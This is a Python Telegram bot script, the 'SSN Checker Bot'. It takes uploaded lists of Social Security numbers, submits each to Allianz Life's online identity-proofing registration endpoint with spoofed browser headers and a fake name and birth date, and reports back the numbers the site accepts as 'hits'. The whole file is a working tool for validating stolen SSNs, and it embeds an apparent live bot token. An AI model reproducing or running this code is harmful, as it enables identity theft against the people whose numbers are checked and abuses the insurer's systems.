import re
import requests
from requests import Session
from telebot import TeleBot
import random

# Initialize bot
bot = TeleBot("7744130778:AAE0ZZhxj2pbVcHZQ5q7beW2iXta5IVa8as")

# Admins
admins = [5084753170, 1971995086]

# Global variables to track progress
total_ssns = 0
checked_ssns = 0
successful_hits = 0
bad_hits = 0

# Reset counters when /start is used
@bot.message_handler(commands=['start'])
def send_welcome(message):
    global total_ssns, checked_ssns, successful_hits, bad_hits
    
    # Reset counters
    total_ssns = 0
    checked_ssns = 0
    successful_hits = 0
    bad_hits = 0

    bot.send_message(message.chat.id, f"Hello {message.from_user.first_name}, welcome to the SSN Checker Bot! 🎉\n"
                                      "Please send me a document with SSNs, and I will check them for you. 📄\n"
                                      "Your progress has been reset! ✅")

# Function to check SSN validity
def check_ssn(ssn: int, full_ssn=False, full=[], pattern=1, recheck=True):
    url = "https://www.allianzlife.com/Registration/individual"
    session = Session()
    resp = session.get(url)

    pattern = r'<meta name="page_identifier" content="([^"]+)">'
    matches = re.findall(pattern, resp.text)
    page_id = matches[0] if matches else ""

    headers = {
        'Host': 'www.allianzlife.com',
        'Content-Length': '415',
        'Sec-Ch-Ua': '"Not(A:Brand";v="24", "Chromium";v="122")',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36',
        'X-Dtpc': '3$193658394_898h6vPAINECCRUEPPTMRAUGUDPISICBWQPAMG-0e0',
        'Content-Type': 'application/json; charset=UTF-8',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Origin': 'https://www.allianzlife.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.allianzlife.com/Registration/individual',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Priority': 'u=1, i'
    }

    data = {
        "context": "IndividualIdProofing",
        "IndividualIdProofing.FirstName": "Nicko",
        "IndividualIdProofing.MiddleInitial": "",
        "IndividualIdProofing.LastName": "Jones",
        "IndividualIdProofing.FULL_SSN_TIN": f"{ssn}",
        "IndividualIdProofing.DateOfBirthMonth": "10",
        "IndividualIdProofing.DateOfBirthDay": "11",
        "IndividualIdProofing.DateOfBirthYear": "2003",
        "chimeraRegisteredPageData": {"pageId": page_id}
    }

    response = session.post("https://www.allianzlife.com/SPA/Registration/Handle", json=data, headers=headers)
    return "Show error message" not in response.text

# Function to check SSN format
def check_format(ssn: str):
    pattern = r'^([^,]+),([^,]+),(\d+),(\d+),(\d+),(\d+)$'
    second_pattern = r'^([^,]+),([^,]+),([^,]+),(\d+),(\d+),(\d+),(\d+)$'
    if ssn.isdecimal():
        return 0
    elif re.match(pattern, ssn):
        return 1
    elif re.match(second_pattern, ssn):
        return 2
    else:
        return -1  # Ignore

# Function to save SSN
def save_ssn(ssn: int, name):
    open(f"succ-{name}.txt", '+a').write(f"{ssn}\n")

# Function to send Telegram message
def send_telegam(ssn: int, telegram_id: int):
    bot.send_message(telegram_id, f"NEW Working SSN : {ssn}")

# Document handler
@bot.message_handler(content_types=['document'])
def doc_handler(message):
    global total_ssns, checked_ssns, successful_hits, bad_hits

    successful_hits = 0
    bad_hits = 0
    checked_ssns = 0

    file_id = message.document.file_id
    file_info = bot.get_file(file_id)
    file_url = f'https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}'

    response = requests.get(file_url)
    if response.status_code == 200:
        name = random.randint(0, 1000000000000) * random.randint(100, 10000000) / random.randint(1, 1000)
        document_content = response.content.decode("utf-8")
        SSNs = document_content.splitlines()
        total_ssns = len(SSNs)

        bot.send_message(message.chat.id, "✅ Successfully Received SSN File.")
        bot.send_message(message.chat.id, f"🔍 Checking SSNs... (ID: {name})")

        for ssn in SSNs:
            checked_ssns += 1
            format_ = check_format(ssn)
            if format_ == 0:
                if check_ssn(ssn):
                    successful_hits += 1
                    send_telegam(ssn, message.chat.id)
                    save_ssn(ssn, name)
                else:
                    bad_hits += 1  # Increment bad hits
            elif format_ == 1:
                ssn_ = ssn.split(",")
                if check_ssn(ssn_[2], True, ssn_):
                    successful_hits += 1
                    send_telegam(ssn, message.chat.id)
                    save_ssn(ssn, name)
                else:
                    bad_hits += 1  # Increment bad hits

    try:
        file = open(f"succ-{name}.txt", "r")
        bot.send_document(message.chat.id, document=file)
        bot.send_message(message.chat.id, f"✅ Done Checking!\n"
                                          f"🎯 Success: {successful_hits}\n"
                                          f"❌ Failures: {bad_hits}")
    except:
        bot.send_message(message.chat.id, "✅ DONE (No valid SSNs found)")

# Progress update command
@bot.message_handler(commands=['update'])
def update_progress(message):
    global total_ssns, checked_ssns, successful_hits, bad_hits
    remaining = total_ssns - checked_ssns

    bot.send_message(message.chat.id, f"📢 Progress Update:\n"
                                      f"🔢 Total SSNs: {total_ssns}\n"
                                      f"✅ Checked SSNs: {checked_ssns}\n"
                                      f"🎯 Successful Hits: {successful_hits}\n"
                                      f"❌ Bad Hits: {bad_hits}\n"
                                      f"⏳ Remaining SSNs: {remaining}")

# Start the bot
bot.polling()
